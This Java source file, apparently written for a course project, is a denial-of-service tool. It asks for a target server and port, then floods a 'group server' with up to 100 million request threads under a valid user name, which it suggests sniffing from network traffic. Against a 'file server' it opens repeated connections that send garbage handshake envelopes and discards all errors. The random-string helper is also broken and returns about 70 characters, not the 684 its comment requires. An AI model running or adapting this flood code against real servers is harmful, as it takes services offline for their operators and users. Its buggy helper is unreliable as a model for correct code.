import java.util.*;
/**
 *
 * @author Richard Dillon
 * @notandIDEuser Bryan... 
 */
public class Attack {
    public static void main(String[] args) {
        //get the ip address of the server that you would like to attack
        Scanner sc = new Scanner(System.in);
        System.out.print("Enter the name of the server that you wish to attack: ");
        String ip = sc.nextLine();
        System.out.print("Enter the port that you would like to use in connecting to the server: ");
        int port = Integer.parseInt(sc.nextLine());
        System.out.print("Enter 'F' for file server or 'G' for group server: ");
        String serverName = sc.nextLine();
        if(serverName.toLowerCase().equals("g")) {
			// you must know atleast one valid user 
			System.out.println("You must know at least one valid user name for the system.");
			System.out.println("If you do not know one, grab a packet sniffer and start rippin!");
			System.out.print("Enter valid user name: ");
			String validUser = sc.nextLine();
		
            //now we have to attack group server, spam the server with requests.
			// spawn tons of threads! make them all loop a bunch!
			System.out.println("1..2..3.. FLOOD THAT SERVER!");
            for (int i = 0; i < 100000000; i++) {
				GroupServerAttackThread floods = new GroupServerAttackThread(ip,port,validUser);
				floods.start();
            }
        }
        else if(serverName.toLowerCase().equals("f")) {
            //now we can attack file server, spam the server with requests.
			//the env normally sends adds a 684 length string which is the Base64 encoded version of the encrypted 512 bytes
			// which are generated from actual handshake data, instead fill with garabage and send it!
			
			String randomString = getRandomString(684);
			Envelope env = new Envelope("AESAndChallenge"); 
			env.addObject(randomString);
			
			// we have a precommputed envelope that has meaningless data, blast off!
            FileClient fc = new FileClient();
            for (int i = 0; i < 1000000000; i++) {
                fc.connect(ip, port);
				if(i%100 == 0) {
						System.out.println("flooded another 100 requests :) ohhh boy!");
				}
				try{
					// write out the envelope
					fc.output.writeObject(env);
				} catch (Exception e) {System.out.println("attacking so squash this error, no one cares!");}
            }
        }
    }
	
	// get a random string num of characters deteremined by length, was taken from mine (bph11) homework 1
	private static String getRandomString(int length)
	{
		int randomIndex = -1;
		String random = "";
		StringBuilder daBuilda = new StringBuilder();
		// alphabet = all possible unique keys on standard keyboard
		String alphabet = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()~`-+=_/\\?><,.:;\"'{}[]|";
		int alength = alphabet.length();
		for(int i = 0; i < alength; i++)
		{
			// pick random index between 0 and alphabet.length-1
			Random reallyRandom_Not = new Random();
			randomIndex = reallyRandom_Not.nextInt(alength);
			daBuilda.append(alphabet.charAt(randomIndex));
		}
		random = daBuilda.toString();
		return random;
	}
}
